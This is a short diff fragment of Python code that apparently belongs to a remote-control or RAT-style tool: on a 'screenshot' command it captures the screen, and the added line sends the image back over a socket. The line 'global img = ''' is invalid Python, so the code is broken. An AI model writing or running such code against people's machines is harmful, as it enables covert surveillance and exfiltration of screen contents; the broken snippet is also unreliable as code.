@@ -17,6 +17,7 @@ def screenshot():
 elif command == "screenshot":
     global img = ''
     img = screenshot()
+    s.sendall(img)
             ''')
 
     elif option == 'info':
